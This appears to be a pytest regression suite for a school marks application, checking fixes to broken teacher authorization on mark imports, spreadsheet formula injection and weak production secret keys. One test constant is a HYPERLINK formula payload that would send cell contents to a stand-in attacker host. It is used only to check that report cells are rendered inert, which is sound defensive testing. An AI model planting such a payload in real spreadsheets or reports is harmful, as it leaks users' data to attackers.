"""Regression tests for findings of the security review (REVIEW-AGENT).

1. Teachers could upload/commit marks for any class and subject of the school, and see/act on
   every import batch (broken authorization on /imports).
2. User-controlled text starting with ``=`` became a live formula in XLSX reports
   (Excel formula injection).
3. A placeholder / short SECRET_KEY was accepted in production (forgeable access tokens).
"""

from collections.abc import Callable
from datetime import UTC, datetime
from decimal import Decimal
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient
from openpyxl import Workbook, load_workbook
from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.config import Settings, settings
from app.dependencies import TenantContext
from app.models import (
    AcademicYear,
    ClassSection,
    Exam,
    ExamSubjectConfig,
    Mark,
    MembershipRole,
    School,
    Student,
    Subject,
    Teacher,
    TeachingAssignment,
)
from app.reports.content import Column, ReportContent, Section, Table
from app.reports.xlsx import neutralize_formulas, render_xlsx

ClientFactory = Callable[[TenantContext], TestClient]
TenantFactory = Callable[..., TenantContext]


# ---------------------------------------------------------------------------
# 1. Teacher scope on marks imports
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _uploads_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(settings, "UPLOADS_DIR", str(tmp_path / "uploads"))


class World:
    def __init__(self, db: Session, school_id: int) -> None:
        year = AcademicYear(school_id=school_id, label="2026-27", is_current=True)
        db.add(year)
        db.flush()
        self.sec_a = ClassSection(
            school_id=school_id, academic_year_id=year.id, grade=8, section="A"
        )
        self.sec_b = ClassSection(
            school_id=school_id, academic_year_id=year.id, grade=9, section="B"
        )
        self.maths = Subject(school_id=school_id, name="Mathematics", code="MATH")
        self.science = Subject(school_id=school_id, name="Science", code="SCI")
        db.add_all([self.sec_a, self.sec_b, self.maths, self.science])
        db.flush()
        self.exam = Exam(school_id=school_id, academic_year_id=year.id, name="UT1", sequence=1)
        db.add(self.exam)
        db.flush()
        for subject in (self.maths, self.science):
            db.add(
                ExamSubjectConfig(
                    school_id=school_id,
                    exam_id=self.exam.id,
                    subject_id=subject.id,
                    max_marks=Decimal("100"),
                    pass_marks=Decimal("35"),
                )
            )
        for n, (adm, section) in enumerate([("A001", self.sec_a), ("B001", self.sec_b)], 1):
            db.add(
                Student(
                    school_id=school_id,
                    class_section_id=section.id,
                    admission_no=adm,
                    full_name=f"Student {adm}",
                    pseudo_id=f"S-SR{school_id}-{n:04d}",
                )
            )
        db.flush()


def _assign(db: Session, ctx: TenantContext, section_id: int, subject_id: int) -> None:
    teacher = db.scalar(select(Teacher).where(Teacher.user_id == ctx.user.id))
    if teacher is None:
        teacher = Teacher(school_id=ctx.school_id, user_id=ctx.user.id, full_name="Teacher")
        db.add(teacher)
        db.flush()
    db.add(
        TeachingAssignment(
            school_id=ctx.school_id,
            teacher_id=teacher.id,
            class_section_id=section_id,
            subject_id=subject_id,
        )
    )
    db.flush()


def _upload(client: TestClient, exam_id: int, content: bytes) -> httpx.Response:
    return client.post(
        "/api/v1/imports",
        data={"exam_id": str(exam_id)},
        files={"file": ("marks.csv", content, "text/csv")},
    )


def _mark_count(db: Session, exam_id: int) -> int:
    return int(
        db.scalar(select(func.count()).select_from(Mark).where(Mark.exam_id == exam_id)) or 0
    )


def test_teacher_cannot_commit_marks_outside_assignments(
    db: Session, make_tenant: TenantFactory, client_as: ClientFactory
) -> None:
    ctx = make_tenant(MembershipRole.teacher)
    w = World(db, ctx.school_id)
    _assign(db, ctx, w.sec_a.id, w.maths.id)  # teaches 8-A Maths only
    client = client_as(ctx)

    # 8-B student and Science are both outside the assignment.
    batch = _upload(client, w.exam.id, b"admission_no,Mathematics,Science\nA001,50,60\nB001,40,\n")
    assert batch.status_code == 201, batch.text
    res = client.post(f"/api/v1/imports/{batch.json()['id']}/commit")
    assert res.status_code == 403, res.text
    assert "outside your teaching assignments" in res.json()["error"]["message"]
    assert _mark_count(db, w.exam.id) == 0


def test_teacher_can_commit_marks_inside_assignments(
    db: Session, make_tenant: TenantFactory, client_as: ClientFactory
) -> None:
    ctx = make_tenant(MembershipRole.teacher)
    w = World(db, ctx.school_id)
    _assign(db, ctx, w.sec_a.id, w.maths.id)
    client = client_as(ctx)

    # Science column blank -> nothing written outside the assignment.
    batch = _upload(client, w.exam.id, b"admission_no,Mathematics,Science\nA001,50,\n")
    assert batch.status_code == 201, batch.text
    res = client.post(f"/api/v1/imports/{batch.json()['id']}/commit")
    assert res.status_code == 200, res.text
    assert res.json()["inserted"] == 1
    assert _mark_count(db, w.exam.id) == 1


def test_coordinator_commit_is_not_restricted(
    db: Session, make_tenant: TenantFactory, client_as: ClientFactory
) -> None:
    ctx = make_tenant(MembershipRole.coordinator)
    w = World(db, ctx.school_id)
    client = client_as(ctx)
    batch = _upload(
        client, w.exam.id, b"admission_no,Mathematics,Science\nA001,50,60\nB001,40,45\n"
    )
    res = client.post(f"/api/v1/imports/{batch.json()['id']}/commit")
    assert res.status_code == 200, res.text
    assert res.json()["inserted"] == 4


def test_teacher_cannot_see_or_act_on_other_users_batches(
    db: Session, make_tenant: TenantFactory, client_as: ClientFactory
) -> None:
    coordinator = make_tenant(MembershipRole.coordinator)
    w = World(db, coordinator.school_id)
    batch = _upload(client_as(coordinator), w.exam.id, b"admission_no,Mathematics\nA001,50\n")
    batch_id = batch.json()["id"]

    teacher = make_tenant(MembershipRole.teacher, school=db.get(School, coordinator.school_id))
    _assign(db, teacher, w.sec_a.id, w.maths.id)
    client = client_as(teacher)

    assert client.get("/api/v1/imports").json() == []
    assert client.get(f"/api/v1/imports/{batch_id}").status_code == 404
    assert client.post(f"/api/v1/imports/{batch_id}/commit").status_code == 404
    assert client.post(f"/api/v1/imports/{batch_id}/reject").status_code == 404
    assert (
        client.put(
            f"/api/v1/imports/{batch_id}/mapping",
            json={"admission_column": "admission_no", "subjects": {}},
        ).status_code
        == 404
    )
    assert _mark_count(db, w.exam.id) == 0


# ---------------------------------------------------------------------------
# 2. XLSX formula injection
# ---------------------------------------------------------------------------

PAYLOAD = '=HYPERLINK("http://evil.example/?x="&A1,"click")'


def test_neutralize_formulas_downgrades_formula_cells() -> None:
    wb = Workbook()
    ws = wb.active
    assert ws is not None
    ws["A1"] = PAYLOAD
    ws["A2"] = "plain"
    assert ws["A1"].data_type == "f"
    assert neutralize_formulas(wb) == 1
    assert ws["A1"].data_type == "s"
    assert ws["A1"].value == PAYLOAD


def test_xlsx_report_never_contains_formulas(tmp_path: Path) -> None:
    content = ReportContent(
        kind="class_teacher",
        title=PAYLOAD,
        school_name="=1+1",
        exam_name="UT1",
        scope_label="8-A",
        generated_at=datetime(2026, 10, 1, tzinfo=UTC),
        figures=[],
        narrative=[PAYLOAD],
        sections=[
            Section(
                title="Students",
                paragraphs=[PAYLOAD],
                tables=[
                    Table(
                        title="Results",
                        columns=[Column("Student"), Column("Plan")],
                        rows=[[PAYLOAD, "=SUM(1,2)"]],
                    )
                ],
            )
        ],
        sheets=["Summary"],
    )
    path = tmp_path / "r.xlsx"
    render_xlsx(content, path)

    wb = load_workbook(path)  # formulas are kept as "=..." strings with data_type "f"
    formula_cells = [
        cell.coordinate
        for ws in wb.worksheets
        for row in ws.iter_rows()
        for cell in row
        if cell.data_type == "f"
    ]
    assert formula_cells == []
    values = {cell.value for ws in wb.worksheets for row in ws.iter_rows() for cell in row}
    assert PAYLOAD in values  # text preserved, just inert


# ---------------------------------------------------------------------------
# 3. Weak SECRET_KEY in production
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["change-me", "dev-insecure-secret-key-change-me", "short-key"])
def test_weak_secret_key_refused_in_production(key: str) -> None:
    cfg = Settings(SECRET_KEY=key, ENVIRONMENT="production")
    with pytest.raises(RuntimeError, match="SECRET_KEY"):
        cfg.warn_insecure_defaults()


def test_weak_secret_key_only_warns_in_development(caplog: pytest.LogCaptureFixture) -> None:
    cfg = Settings(SECRET_KEY="change-me", ENVIRONMENT="development")
    cfg.warn_insecure_defaults()
    assert "SECRET_KEY is weak" in caplog.text


def test_strong_secret_key_accepted_in_production() -> None:
    cfg = Settings(SECRET_KEY="x" * 48, ENVIRONMENT="production")
    cfg.warn_insecure_defaults()
